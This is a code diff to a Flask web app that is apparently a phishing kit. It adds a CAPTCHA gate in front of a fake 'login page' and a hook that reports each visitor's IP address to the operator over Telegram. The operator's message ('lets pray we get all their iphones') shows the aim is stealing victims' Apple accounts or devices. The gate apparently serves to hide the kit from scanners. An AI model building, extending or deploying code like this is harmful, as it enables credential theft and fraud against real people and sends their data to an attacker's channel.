@@ -1,5 +1,7 @@
 from flask import Flask, render_template, request, redirect, url_for, session
 import requests
+import random
+import string
 
 app = Flask(__name__)
 app.secret_key = "some_random_secret_key_here"
@@ -21,9 +23,49 @@ def send_to_telegram(message_text):
     except Exception as e:
         print("Telegram send error:", e)
 
+def generate_captcha(length=6):
+    """Generate a random alphanumeric CAPTCHA code."""
+    letters_and_digits = string.ascii_letters + string.digits
+    captcha = ''.join(random.choice(letters_and_digits) for _ in range(length))
+    return captcha
+
+@app.route("/captcha", methods=["GET", "POST"])
+def captcha():
+    """
+    CAPTCHA verification route.
+    - GET: Display CAPTCHA form.
+    - POST: Validate CAPTCHA and redirect to home.
+    """
+    if request.method == "POST":
+        user_captcha = request.form.get("captcha")
+        real_captcha = session.get("captcha_code", "")
+
+        if user_captcha.lower() == real_captcha.lower():
+            # CAPTCHA passed
+            visitor_ip = request.remote_addr
+            custom_message = f"A user from IP {visitor_ip} has entered diddies den. lets pray we get all their iphones."
+            send_to_telegram(custom_message)
+            session["captcha_passed"] = True
+            return redirect(url_for("home"))
+        else:
+            # CAPTCHA failed
+            error_message = "Incorrect CAPTCHA. Please try again."
+            # Generate a new CAPTCHA
+            new_captcha = generate_captcha()
+            session["captcha_code"] = new_captcha
+            return render_template("captcha.html", captcha=new_captcha, error=error_message)
+    else:
+        # GET request: Show CAPTCHA
+        captcha_code = generate_captcha()
+        session["captcha_code"] = captcha_code
+        return render_template("captcha.html", captcha=captcha_code)
+
 @app.route("/")
 def home():
-    """Main login page."""
+    """Main login page. Accessible only after passing CAPTCHA."""
+    if not session.get("captcha_passed"):
+        return redirect(url_for("captcha"))
+
     print(">>> GET / - Rendering index.html")
     return render_template("index.html")
 
@@ -97,4 +139,3 @@ def success():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
-
